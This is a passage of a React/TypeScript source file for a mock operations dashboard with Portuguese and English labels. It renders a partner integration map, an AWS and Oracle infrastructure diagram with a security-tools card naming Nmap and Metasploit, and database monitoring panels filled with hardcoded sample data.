          <p className="text-slate-500">Gestão de parceiros e fluxos de dados via Email e FTP.</p>
        </div>
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList>
            <TabsTrigger value="map">Circuit Map</TabsTrigger>
            <TabsTrigger value="folders">File Explorer</TabsTrigger>
            <TabsTrigger value="logs">Execution Logs</TabsTrigger>
          </TabsList>
        </Tabs>
      </div>

      <div className="flex-1 min-h-0">
        <AnimatePresence mode="wait">
          {activeTab === 'map' && (
            <motion.div
              key="map"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="h-full bg-slate-50 rounded-3xl border-2 border-slate-100 p-12 relative overflow-hidden"
            >
              <div className="relative z-10 flex items-center justify-center h-full">
                {/* Central Server */}
                <div className="relative flex flex-col items-center gap-4">
                  <div className="w-40 h-48 bg-slate-800 rounded-2xl shadow-2xl flex flex-col items-center justify-center border-b-8 border-slate-950 relative">
                    <div className="absolute top-4 left-4 right-4 flex flex-col gap-2">
                      <div className="h-1 bg-slate-700 rounded-full w-3/4" />
                      <div className="h-1 bg-slate-700 rounded-full w-1/2" />
                      <div className="h-1 bg-slate-700 rounded-full w-2/3" />
                    </div>
                    <Server className="w-16 h-16 text-blue-400 mb-2" />
                    <div className="flex gap-1">
                      <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
                      <div className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse delay-75" />
                      <div className="w-1.5 h-1.5 rounded-full bg-slate-600" />
                    </div>
                  </div>
                  <div className="text-center">
                    <p className="text-xs font-bold uppercase tracking-widest text-slate-400">Servidor</p>
                    <p className="text-lg font-bold text-slate-900">JardimPartnerIntegration</p>
                  </div>
                </div>

                {/* Integration Paths */}
                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                  {/* Via Email Path */}
                  <svg className="absolute w-full h-full overflow-visible">
                    <path 
                      d="M 50% 50% Q 65% 30% 80% 25%" 
                      fill="none" 
                      stroke="url(#emailGradient)" 
                      strokeWidth="12" 
                      strokeLinecap="round"
                      className="opacity-20"
                    />
                    <path 
                      d="M 50% 50% Q 65% 30% 80% 25%" 
                      fill="none" 
                      stroke="url(#emailGradient)" 
                      strokeWidth="4" 
                      strokeLinecap="round"
                      strokeDasharray="10 20"
                      className="animate-[dash_20s_linear_infinite]"
                    />
                    <defs>
                      <linearGradient id="emailGradient" x1="0%" y1="0%" x2="100%" y2="0%">
                        <stop offset="0%" stopColor="#f97316" />
                        <stop offset="100%" stopColor="#fb923c" />
                      </linearGradient>
                    </defs>
                  </svg>

                  {/* Via FTP Path */}
                  <svg className="absolute w-full h-full overflow-visible">
                    <path 
                      d="M 50% 50% Q 65% 70% 80% 75%" 
                      fill="none" 
                      stroke="url(#ftpGradient)" 
                      strokeWidth="12" 
                      strokeLinecap="round"
                      className="opacity-20"
                    />
                    <path 
                      d="M 50% 50% Q 65% 70% 80% 75%" 
                      fill="none" 
                      stroke="url(#ftpGradient)" 
                      strokeWidth="4" 
                      strokeLinecap="round"
                      strokeDasharray="10 20"
                      className="animate-[dash_20s_linear_infinite]"
                    />
                    <defs>
                      <linearGradient id="ftpGradient" x1="0%" y1="0%" x2="100%" y2="0%">
                        <stop offset="0%" stopColor="#06b6d4" />
                        <stop offset="100%" stopColor="#22d3ee" />
                      </linearGradient>
                    </defs>
                  </svg>
                </div>

                {/* Labels */}
                <div className="absolute top-[35%] right-[25%] -rotate-12">
                  <Badge className="bg-orange-500 text-white border-none shadow-lg">Via Email</Badge>
                </div>
                <div className="absolute bottom-[35%] right-[25%] rotate-12">
                  <Badge className="bg-cyan-500 text-white border-none shadow-lg">Via FTP</Badge>
                </div>

                {/* Partners List */}
                <div className="absolute right-12 top-0 bottom-0 flex flex-col justify-center gap-4">
                  {companies.map((company, i) => (
                    <motion.div
                      key={company.name}
                      initial={{ opacity: 0, x: 50 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ delay: i * 0.1 }}
                      className={cn(
                        "flex items-center gap-3 p-3 rounded-2xl bg-white border-2 shadow-sm w-48 transition-all hover:scale-105 cursor-pointer",
                        company.border
                      )}
                    >
                      <div className={cn("p-2 rounded-lg", company.bg)}>
                        <User className={cn("w-4 h-4", company.color)} />
                      </div>
                      <div>
                        <p className="text-sm font-bold text-slate-900">{company.name}</p>
                        <p className={cn("text-[10px] font-bold uppercase tracking-tighter", company.color)}>{company.type}</p>
                      </div>
                    </motion.div>
                  ))}
                </div>
              </div>

              {/* Bottom Folders */}
              <div className="absolute bottom-8 left-12 flex gap-8">
                {[
                  { name: 'Inqueue', desc: 'Incoming orders' },
                  { name: 'ftpExchange / outbox', desc: 'Pedidos que enviamos' },
                  { name: 'ftpExchange / inbox', desc: 'Feedback que recebemos' },
                ].map((folder, i) => (
                  <div key={folder.name} className="flex flex-col items-center gap-2 group cursor-pointer">
                    <div className="w-16 h-12 bg-blue-100 rounded-lg border-2 border-blue-200 flex items-center justify-center group-hover:bg-blue-200 transition-colors">
                      <Box className="w-6 h-6 text-blue-600" />
                    </div>
                    <div className="text-center">
                      <p className="text-[10px] font-bold text-slate-900">{folder.name}</p>
                      <p className="text-[8px] text-slate-400">{folder.desc}</p>
                    </div>
                  </div>
                ))}
              </div>
            </motion.div>
          )}

          {activeTab === 'folders' && (
            <motion.div
              key="folders"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="h-full flex flex-col gap-6"
            >
              <div className="grid grid-cols-3 gap-6 flex-1">
                {Object.entries(ediFiles).map(([folder, files]: [string, any[]]) => (
                  <Card key={folder} className="flex flex-col">
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center gap-2">
                        <Box className="w-4 h-4 text-blue-500" />
                        {folder}
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="flex-1 overflow-auto">
                      <div className="space-y-2">
                        {files.map((file, i) => (
                          <div 
                            key={i} 
                            onClick={() => setSelectedFile(file)}
                            className="flex items-center justify-between p-2 rounded-lg hover:bg-slate-50 border border-transparent hover:border-slate-100 transition-all cursor-pointer group"
                          >
                            <div className="flex items-center gap-2">
                              <FileCode className="w-4 h-4 text-slate-400 group-hover:text-blue-500" />
                              <span className="text-xs font-mono">{file.name}</span>
                            </div>
                            <span className="text-[10px] text-slate-400">{file.size}</span>
                          </div>
                        ))}
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>

              {selectedFile && (
                <Card className="border-2 border-blue-200 bg-blue-50/30">
                  <CardHeader className="py-3 flex flex-row items-center justify-between border-b border-blue-100">
                    <div className="flex items-center gap-2">
                      <FileCode className="w-4 h-4 text-blue-600" />
                      <CardTitle className="text-sm">{selectedFile.name}</CardTitle>
                    </div>
                    <Button variant="ghost" size="sm" onClick={() => setSelectedFile(null)}>
                      <XCircle className="w-4 h-4" />
                    </Button>
                  </CardHeader>
                  <CardContent className="p-4">
                    <pre className="text-[10px] font-mono text-blue-900 overflow-auto max-h-48 bg-white/50 p-4 rounded-xl">
                      {selectedFile.content}
                    </pre>
                  </CardContent>
                </Card>
              )}
            </motion.div>
          )}

          {activeTab === 'logs' && (
            <motion.div
              key="logs"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="h-full"
            >
              <Terminal logs={logs} showPrompt={false} />
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
};

const InfrastructureView = ({ isApacheRunning }: { isApacheRunning: boolean }) => {
  const infoData = {
    waf: {
      title: "AWS WAF",
      description: "Web Application Firewall que protege contra exploits comuns na web e bots maliciosos. Filtra o tráfego antes de chegar à infraestrutura interna."
    },
    cloudfront: {
      title: "CloudFront",
      description: "Rede de Entrega de Conteúdo (CDN) global da AWS. Faz o cache de conteúdo estático e dinâmico perto dos usuários para reduzir a latência."
    },
    alb: {
      title: "App Load Balancer",
      description: "Distribui o tráfego de entrada entre vários alvos, como instâncias EC2 ou containers, garantindo alta disponibilidade e tolerância a falhas."
    },
    apache: {
      title: "Apache HTTPD",
      description: "Servidor web robusto que atua como proxy reverso e servidor de arquivos estáticos, gerenciando as requisições antes de enviá-las para as APIs."
    },
    frontend: {
      title: "Portal Frontend",
      description: "Aplicação cliente construída com React e Vite. É o que o usuário final vê e interage no navegador."
    },
    api: {
      title: "Portal API",
      description: "Backend principal em Node.js/Express. Processa a lógica de negócio e comunica com o banco de dados Oracle."
    },
    auth: {
      title: "Auth Service",
      description: "Serviço de autenticação em Go. Gerencia tokens OAuth2 e garante que apenas usuários autorizados acessem o sistema."
    },
    oracle: {
      title: "Oracle 19c",
      description: "Banco de dados relacional principal. Armazena todos os dados críticos de negócio com alta consistência e segurança."
    },
    redis: {
      title: "Redis Cache",
      description: "Banco de dados em memória usado para cache de sessões e dados frequentes, acelerando drasticamente o tempo de resposta."
    },
    cyber: {
      title: "Cybersecurity Hub",
      description: "Central de monitoramento e ferramentas de segurança (Nmap, Metasploit) para detecção proativa de vulnerabilidades."
    },
    jardim: {
      title: "JardimPartner Integration",
      description: "Integração externa com parceiros de logística e fornecedores para sincronização de estoque e pedidos."
    },
    edi: {
      title: "EDI Partners",
      description: "Intercâmbio Eletrônico de Dados com parceiros comerciais para automação de processos de compra e faturação."
    }
  };

  const InfoItem = ({ id, children }: { id: keyof typeof infoData, children: React.ReactNode }) => (
    <Popover>
      <PopoverTrigger>
        <div className="cursor-help transition-transform hover:scale-105 active:scale-95">
          {children}
        </div>
      </PopoverTrigger>
      <PopoverContent className="w-80 p-4 bg-white border-2 border-slate-200 shadow-xl rounded-2xl">
        <div className="space-y-2">
          <h4 className="font-bold text-slate-900 flex items-center gap-2">
            <Info className="w-4 h-4 text-blue-600" />
            {infoData[id].title}
          </h4>
          <p className="text-xs text-slate-600 leading-relaxed">
            {infoData[id].description}
          </p>
        </div>
      </PopoverContent>
    </Popover>
  );

  return (
    <div className="space-y-8">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Infrastructure Architecture</h1>
          <p className="text-slate-500">Live architectural map of the production environment.</p>
        </div>
        <div className="flex gap-2">
          <Badge variant="outline" className={cn(
            "border-2",
            isApacheRunning ? "bg-green-50 text-green-700 border-green-200" : "bg-red-50 text-red-700 border-red-200"
          )}>
            <Activity className="w-3 h-3 mr-1" /> 
            {isApacheRunning ? "All Systems Operational" : "System Degraded: Apache Offline"}
          </Badge>
        </div>
      </div>

      <Card className="bg-slate-50/50 border-slate-200 overflow-hidden">
        <CardContent className="p-12">
          <div className="relative flex flex-col items-center gap-12">
            {/* Layer 1: Users */}
            <div className="flex flex-col items-center gap-2">
              <div className="w-12 h-12 bg-white rounded-full border-2 border-slate-200 flex items-center justify-center shadow-sm">
                <Globe className="w-6 h-6 text-slate-400" />
              </div>
              <span className="text-xs font-bold uppercase tracking-wider text-slate-500">Public Internet</span>
            </div>

            <ArrowRight className="w-6 h-6 text-slate-300 rotate-90" />

            {/* Layer 2: Edge */}
            <div className="grid grid-cols-2 gap-24 relative">
              <div className="flex flex-col items-center gap-3">
                <InfoItem id="waf">
                  <div className="w-24 h-24 bg-white rounded-2xl border-2 border-blue-100 flex flex-col items-center justify-center shadow-sm hover:border-blue-500 transition-all group">
                    <Shield className="w-8 h-8 text-blue-600 mb-1" />
                    <span className="text-[10px] font-bold uppercase text-blue-600">AWS WAF</span>
                  </div>
                </InfoItem>
                <Badge variant="secondary" className="bg-green-100 text-green-700">Active</Badge>
              </div>
              <div className="flex flex-col items-center gap-3">
                <InfoItem id="cloudfront">
                  <div className="w-24 h-24 bg-white rounded-2xl border-2 border-blue-100 flex flex-col items-center justify-center shadow-sm hover:border-blue-500 transition-all group">
                    <Layers className="w-8 h-8 text-blue-600 mb-1" />
                    <span className="text-[10px] font-bold uppercase text-blue-600">CloudFront</span>
                  </div>
                </InfoItem>
                <Badge variant="secondary" className="bg-green-100 text-green-700">99.9% Cache Hit</Badge>
              </div>
              
              {/* Connection Line */}
              <div className="absolute top-1/2 left-1/4 right-1/4 h-px bg-slate-200 -z-10" />
            </div>

            <ArrowRight className="w-6 h-6 text-slate-300 rotate-90" />

            {/* Layer 3: Load Balancing & Web Server */}
            <div className="flex flex-col items-center gap-6">
              <div className="flex gap-12 items-center">
                <div className="flex flex-col items-center gap-3">
                  <InfoItem id="alb">
                    <div className="w-32 h-20 bg-blue-600 rounded-xl flex flex-col items-center justify-center shadow-lg text-white">
                      <RefreshCw className="w-6 h-6 mb-1" />
                      <span className="text-[10px] font-bold uppercase">App Load Balancer</span>
                    </div>
                  </InfoItem>
                  <p className="text-[10px] font-mono text-slate-400">alb-prod-01.aws.com</p>
                </div>

                <ArrowRight className="w-6 h-6 text-slate-300" />

                <div className="flex flex-col items-center gap-3">
                  <InfoItem id="apache">
                    <div className={cn(
                      "w-32 h-20 rounded-xl flex flex-col items-center justify-center shadow-lg text-white transition-all",
                      isApacheRunning ? "bg-red-600" : "bg-slate-400 grayscale"
                    )}>
                      <Server className="w-6 h-6 mb-1" />
                      <span className="text-[10px] font-bold uppercase">Apache HTTPD</span>
                    </div>
                  </InfoItem>
                  <Badge variant="outline" className={cn(
                    "text-[8px] uppercase",
                    isApacheRunning ? "text-green-600 border-green-200" : "text-red-600 border-red-200"
                  )}>
                    {isApacheRunning ? "Running" : "Stopped"}
                  </Badge>
                </div>
              </div>
            </div>

            <div className="w-full max-w-4xl h-px bg-slate-200 relative">
              <div className="absolute top-0 left-1/4 w-px h-12 bg-slate-200" />
              <div className="absolute top-0 left-1/2 w-px h-12 bg-slate-200" />
              <div className="absolute top-0 left-3/4 w-px h-12 bg-slate-200" />
            </div>

            {/* Layer 4: Compute (EKS) */}
            <div className="grid grid-cols-3 gap-12 w-full max-w-5xl">
              <InfoItem id="frontend">
                <div className="bg-white p-6 rounded-2xl border-2 border-slate-200 shadow-sm space-y-4 h-full">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-blue-50 rounded-lg flex items-center justify-center">
                      <Cpu className="w-5 h-5 text-blue-600" />
                    </div>
                    <div>
                      <h4 className="text-sm font-bold">Portal Frontend</h4>
                      <p className="text-[10px] text-slate-500">React / Vite / Tailwind</p>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <div className="flex justify-between text-[10px]">
                      <span className="text-slate-500">Replicas</span>
                      <span className="font-bold">6 / 6</span>
                    </div>
                    <div className="h-1.5 bg-slate-100 rounded-full overflow-hidden">
                      <div className="h-full bg-green-500 w-full" />
                    </div>
                  </div>
                </div>
              </InfoItem>

              <InfoItem id="api">
                <div className="bg-white p-6 rounded-2xl border-2 border-blue-500 shadow-md space-y-4 relative ring-4 ring-blue-50 h-full">
                  <div className="absolute -top-3 left-1/2 -translate-x-1/2">
                    <Badge className="bg-blue-600">Primary API</Badge>
                  </div>
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-blue-50 rounded-lg flex items-center justify-center">
                      <Activity className="w-5 h-5 text-blue-600" />
                    </div>
                    <div>
                      <h4 className="text-sm font-bold">Portal API</h4>
                      <p className="text-[10px] text-slate-500">Node.js / Express / Oracle</p>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <div className="flex justify-between text-[10px]">
                      <span className="text-slate-500">Throughput</span>
                      <span className="font-bold">12.4k req/s</span>
                    </div>
                    <div className="h-1.5 bg-slate-100 rounded-full overflow-hidden">
                      <div className="h-full bg-blue-500 w-[85%]" />
                    </div>
                  </div>
                </div>
              </InfoItem>

              <InfoItem id="auth">
                <div className="bg-white p-6 rounded-2xl border-2 border-slate-200 shadow-sm space-y-4 h-full">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-blue-50 rounded-lg flex items-center justify-center">
                      <Shield className="w-5 h-5 text-blue-600" />
                    </div>
                    <div>
                      <h4 className="text-sm font-bold">Auth Service</h4>
                      <p className="text-[10px] text-slate-500">Go / OAuth2</p>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <div className="flex justify-between text-[10px]">
                      <span className="text-slate-500">Latency</span>
                      <span className="font-bold">12ms</span>
                    </div>
                    <div className="h-1.5 bg-slate-100 rounded-full overflow-hidden">
                      <div className="h-full bg-green-500 w-full" />
                    </div>
                  </div>
                </div>
              </InfoItem>
            </div>

            <div className="w-full max-w-4xl h-px bg-slate-200 relative">
              <div className="absolute bottom-0 left-1/4 w-px h-12 bg-slate-200" />
              <div className="absolute bottom-0 left-3/4 w-px h-12 bg-slate-200" />
            </div>

            {/* Layer 5: Data, External & Security */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-12 w-full max-w-7xl">
              <div className="space-y-4">
                <h5 className="text-[10px] font-bold text-slate-400 uppercase text-center">Persistence Layer</h5>
                <div className="grid grid-cols-2 gap-4">
                  <InfoItem id="oracle">
                    <div className="bg-slate-900 text-white p-4 rounded-xl flex flex-col items-center gap-2 shadow-lg border border-red-900 w-full">
                      <Database className="w-6 h-6 text-red-500" />
                      <span className="text-[10px] font-bold uppercase">Oracle 19c</span>
                    </div>
                  </InfoItem>
                  <InfoItem id="redis">
                    <div className="bg-slate-900 text-white p-4 rounded-xl flex flex-col items-center gap-2 shadow-lg border border-orange-900 w-full">
                      <HardDrive className="w-6 h-6 text-orange-400" />
                      <span className="text-[10px] font-bold uppercase">Redis Cache</span>
                    </div>
                  </InfoItem>
                </div>
              </div>

              <div className="space-y-4">
                <h5 className="text-[10px] font-bold text-slate-400 uppercase text-center">Security & Monitoring</h5>
                <InfoItem id="cyber">
                  <div className="bg-slate-900 text-white p-6 rounded-2xl border-2 border-red-600 shadow-xl relative overflow-hidden group h-full">
                    <div className="absolute top-0 right-0 p-2 opacity-20 group-hover:opacity-100 transition-opacity">
                      <Shield className="w-12 h-12 text-red-600" />
                    </div>
                    <div className="relative z-10">
                      <div className="flex items-center gap-2 mb-3">
                        <Shield className="w-5 h-5 text-red-500" />
                        <span className="text-xs font-bold uppercase tracking-widest">Cybersecurity Hub</span>
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <div className="text-[8px] bg-slate-800 p-1.5 rounded border border-slate-700">Nmap Scanner</div>
                        <div className="text-[8px] bg-slate-800 p-1.5 rounded border border-slate-700">WAF Interceptor</div>
                        <div className="text-[8px] bg-slate-800 p-1.5 rounded border border-slate-700">Metasploit Console</div>
                        <div className="text-[8px] bg-slate-800 p-1.5 rounded border border-slate-700">Hashcat Engine</div>
                      </div>
                    </div>
                  </div>
                </InfoItem>
              </div>

              <div className="space-y-4">
                <h5 className="text-[10px] font-bold text-slate-400 uppercase text-center">External Integrations</h5>
                <div className="grid grid-cols-2 gap-4">
                  <InfoItem id="jardim">
                    <div className="bg-blue-50 border-2 border-blue-500 p-4 rounded-xl flex flex-col items-center gap-2 shadow-sm ring-4 ring-blue-50/50 w-full">
                      <Server className="w-6 h-6 text-blue-600" />
                      <span className="text-[9px] font-bold text-center leading-tight">JardimPartner<br/>Integration</span>
                    </div>
                  </InfoItem>
                  <InfoItem id="edi">
                    <div className="bg-white border-2 border-slate-100 p-4 rounded-xl flex flex-col items-center gap-2 w-full">
                      <Network className="w-6 h-6 text-cyan-500" />
                      <span className="text-[9px] font-bold uppercase">EDI Partners</span>
                    </div>
                  </InfoItem>
                </div>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm">Network Topology</CardTitle>
          </CardHeader>
          <CardContent>
            <p className="text-xs text-slate-500 leading-relaxed">
              The application is deployed across 3 Availability Zones (AZs) in us-east-1. 
              Traffic is routed via Route53 with latency-based routing enabled.
            </p>
          </CardContent>
        </Card>
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm">Security Perimeter</CardTitle>
          </CardHeader>
          <CardContent>
            <p className="text-xs text-slate-500 leading-relaxed">
              All VPC subnets are private. Public access is only allowed through the ALB 
              which is protected by AWS WAF and Shield Advanced.
            </p>
          </CardContent>
        </Card>
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm">Scalability Policy</CardTitle>
          </CardHeader>
          <CardContent>
            <p className="text-xs text-slate-500 leading-relaxed">
              Horizontal Pod Autoscaler (HPA) is configured to scale based on CPU (70%) 
              and Request Count (1000/s per pod).
            </p>
          </CardContent>
        </Card>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm flex items-center gap-2">
              <Eye className="w-4 h-4 text-blue-500" />
              CloudWatch Alarms
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-2">
              {[
                { name: 'CPU Utilization > 80%', status: 'OK' },
                { name: '5XX Errors > 1%', status: 'OK' },
                { name: 'DB Connection Count', status: 'OK' },
                { name: 'Apache Service Status', status: isApacheRunning ? 'OK' : 'ALARM' },
              ].map((alarm) => (
                <div key={alarm.name} className="flex justify-between items-center p-2 bg-slate-50 rounded border">
                  <span className="text-xs font-medium">{alarm.name}</span>
                  <Badge className={alarm.status === 'OK' ? 'bg-green-500' : 'bg-red-500'}>{alarm.status}</Badge>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm flex items-center gap-2">
              <Users className="w-4 h-4 text-blue-500" />
              IAM & User Management
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-2">
              {[
                { user: 'pedrobzg@gmail.com', role: 'Administrator', access: 'Full Access' },
                { user: 'architect_system', role: 'Architect', access: 'Infrastructure' },
                { user: 'operator_01', role: 'Operator', access: 'ReadOnly' },
              ].map((u) => (
                <div key={u.user} className="flex justify-between items-center p-2 bg-slate-50 rounded border">
                  <div>
                    <p className="text-xs font-bold">{u.user}</p>
                    <p className="text-[10px] text-slate-500">{u.role}</p>
                  </div>
                  <Badge variant="outline" className="text-[10px]">{u.access}</Badge>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

const DatabaseView = () => {
  const [selectedDb, setSelectedDb] = useState<DatabaseInstance>(mockDatabases[0]);

  return (
    <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 h-full">
      {/* DB List */}
      <div className="lg:col-span-4 flex flex-col gap-4 overflow-hidden min-h-0 h-full">
        <div className="flex items-center justify-between shrink-0">
          <h2 className="text-xl font-bold">Database Instances</h2>
          <Badge variant="secondary">{mockDatabases.length} Active</Badge>
        </div>
        <ScrollArea className="flex-1 border rounded-xl bg-white min-h-0">
          <div className="divide-y">
            {mockDatabases.map((db) => (
              <div 
                key={db.id}
                onClick={() => setSelectedDb(db)}
                className={cn(
                  "p-4 cursor-pointer transition-all hover:bg-slate-50",
                  selectedDb.id === db.id ? "bg-blue-50 border-l-4 border-l-blue-600" : "border-l-4 border-l-transparent"
                )}
              >
                <div className="flex justify-between items-start mb-2">
                  <Badge variant="outline" className="text-[10px] uppercase">{db.type}</Badge>
                  <div className={cn(
                    "w-2 h-2 rounded-full",
                    db.status === 'healthy' ? "bg-green-500" : "bg-yellow-500"
                  )} />
                </div>
                <h3 className="font-bold text-sm mb-1">{db.name}</h3>
                <div className="flex items-center justify-between mt-3">
                  <span className="text-xs text-slate-500">{db.region}</span>
                  <span className="text-xs font-medium">{db.connections} connections</span>
                </div>
              </div>
            ))}
          </div>
        </ScrollArea>
      </div>

      {/* DB Details */}
      <div className="lg:col-span-8 flex flex-col gap-6 overflow-hidden">
        <Card className="shrink-0">
          <CardContent className="p-6">
            <div className="flex justify-between items-start mb-6">
              <div>
                <div className="flex items-center gap-3 mb-2">
                  <Badge className="bg-blue-600">{selectedDb.type}</Badge>
                  <span className="text-sm font-mono text-slate-500">{selectedDb.id}</span>
                </div>
                <h1 className="text-2xl font-bold">{selectedDb.name}</h1>
                <p className="text-sm text-slate-500 mt-1">Primary Instance • {selectedDb.region}</p>
              </div>
              <div className="flex gap-2">
                <Button variant="outline" size="sm" className="gap-2">
                  <RefreshCw className="w-4 h-4" /> Restart
                </Button>
                <Button size="sm" className="bg-blue-600">Scale Up</Button>
              </div>
            </div>

            <div className="grid grid-cols-4 gap-6">
              <div className="space-y-1">
                <p className="text-[10px] uppercase font-bold text-slate-400">CPU Usage</p>
                <p className="text-xl font-bold">{selectedDb.cpuUsage}%</p>
                <div className="h-1.5 bg-slate-100 rounded-full overflow-hidden">
                  <div className={cn("h-full", selectedDb.cpuUsage > 80 ? "bg-red-500" : "bg-blue-500")} style={{ width: `${selectedDb.cpuUsage}%` }} />
                </div>
              </div>
              <div className="space-y-1">
                <p className="text-[10px] uppercase font-bold text-slate-400">Memory</p>
                <p className="text-xl font-bold">{selectedDb.memoryUsage}%</p>
                <div className="h-1.5 bg-slate-100 rounded-full overflow-hidden">
                  <div className="h-full bg-purple-500" style={{ width: `${selectedDb.memoryUsage}%` }} />
                </div>
              </div>
              <div className="space-y-1">
                <p className="text-[10px] uppercase font-bold text-slate-400">Connections</p>
                <p className="text-xl font-bold">{selectedDb.connections}/{selectedDb.maxConnections}</p>
                <div className="h-1.5 bg-slate-100 rounded-full overflow-hidden">
                  <div className="h-full bg-green-500" style={{ width: `${(selectedDb.connections / selectedDb.maxConnections) * 100}%` }} />
                </div>
              </div>
              <div className="space-y-1">
                <p className="text-[10px] uppercase font-bold text-slate-400">Storage</p>
                <p className="text-xl font-bold">{selectedDb.storageUsed}GB / {selectedDb.storageTotal}GB</p>
                <div className="h-1.5 bg-slate-100 rounded-full overflow-hidden">
                  <div className="h-full bg-orange-500" style={{ width: `${(selectedDb.storageUsed / selectedDb.storageTotal) * 100}%` }} />
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        <Tabs defaultValue="queries" className="flex-1 flex flex-col min-h-0">
          <TabsList className="bg-slate-100 p-1 w-fit">
            <TabsTrigger value="queries">Slow Queries</TabsTrigger>
            <TabsTrigger value="backups">Backups</TabsTrigger>
            <TabsTrigger value="config">Configuration</TabsTrigger>
          </TabsList>
          
          <TabsContent value="queries" className="flex-1 mt-4 m-0 overflow-hidden">
            <Card className="h-full">
              <ScrollArea className="h-full">
                <table className="w-full text-sm text-left">
                  <thead className="bg-slate-50 border-b text-slate-500 font-medium uppercase text-[10px] tracking-wider sticky top-0">
                    <tr>
                      <th className="px-6 py-3">Query Template</th>
                      <th className="px-6 py-3">Avg Duration</th>
                      <th className="px-6 py-3">Calls/Min</th>
                      <th className="px-6 py-3">P95</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y">
                    {mockQueries.map((q, i) => (
                      <tr key={i} className="hover:bg-slate-50 transition-colors">
                        <td className="px-6 py-4 font-mono text-xs text-slate-600 max-w-md truncate">{q.query}</td>
                        <td className="px-6 py-4 font-medium">{q.avgDuration}ms</td>
                        <td className="px-6 py-4">{q.callsPerMin}</td>
                        <td className="px-6 py-4">
                          <Badge variant="outline" className={cn(q.p95 > 100 ? "text-red-600 border-red-200 bg-red-50" : "")}>
                            {q.p95}ms
                          </Badge>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </ScrollArea>
            </Card>
          </TabsContent>
          <TabsContent value="backups" className="flex-1 mt-4 m-0">
            <Card className="h-full flex items-center justify-center text-slate-400">
              <div className="text-center">
                <Database className="w-12 h-12 mx-auto mb-4 opacity-20" />
                <p>Automated backups are enabled. Last backup: 4h ago.</p>
              </div>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

const chartData = [
  { time: '00:00', incidents: 2, health: 98 },
  { time: '04:00', incidents: 1, health: 99 },
  { time: '08:00', incidents: 5, health: 85 },
  { time: '12:00', incidents: 3, health: 92 },
  { time: '16:00', incidents: 4, health: 88 },
  { time: '20:00', incidents: 2, health: 95 },
  { time: '23:59', incidents: 1, health: 97 },
];

export default function App() {
  const [activeTab, setActiveTab] = useState('dashboard');
  const [selectedIncident, setSelectedIncident] = useState<Incident | null>(mockIncidents[0]);
  const [bgTheme, setBgTheme] = useState<'slate' | 'zinc' | 'blue' | 'dark' | 'emerald' | 'rose' | 'amber' | 'indigo'>('slate');
  const [language, setLanguage] = useState<'pt' | 'en'>('pt');
  const [terminalLogs, setTerminalLogs] = useState<string[]>([
    'Initializing OpsCenter v2.4.0...',
    'Connecting to AWS us-east-1...',
    'Connecting to Oracle Cloud eu-central-1...',
    'Portal de Jardinagem: ONLINE',
    'Oracle DB Sync: SUCCESS',
    'Ready for input.'
  ]);

  const [isApacheRunning, setIsApacheRunning] = useState(true);

  const addLog = (msg: string) => {
    setTerminalLogs(prev => [...prev.slice(-100), msg]);
  };

  const handleAction = (action: string) => {
    addLog(`Executing: ${action}...`);
    setTimeout(() => {
      addLog(`SUCCESS: ${action} completed successfully.`);
    }, 1000);
  };

  const bgClasses = {
    slate: "bg-slate-50",
    zinc: "bg-zinc-50",
    blue: "bg-blue-50/30",
    dark: "bg-slate-900 text-slate-100",
    emerald: "bg-emerald-50/30",
    rose: "bg-rose-50/30",
    amber: "bg-amber-50/30",
    indigo: "bg-indigo-50/30",
  };

  return (
    <div className={cn("flex h-screen font-sans overflow-hidden transition-colors duration-500", bgClasses[bgTheme], bgTheme === 'dark' ? "text-slate-100" : "text-slate-900")}>
      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} />
      
      <main className="flex-1 flex flex-col min-w-0">
        {/* Header */}
        <header className={cn("h-16 border-b flex items-center justify-between px-8 shrink-0 transition-colors duration-500", bgTheme === 'dark' ? "bg-slate-800 border-slate-700" : "bg-white border-slate-200")}>
          <div className="flex items-center gap-4 flex-1">
            <div className="relative w-96">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
              <input 
                type="text" 
                placeholder="Search incidents, logs, or systems..." 
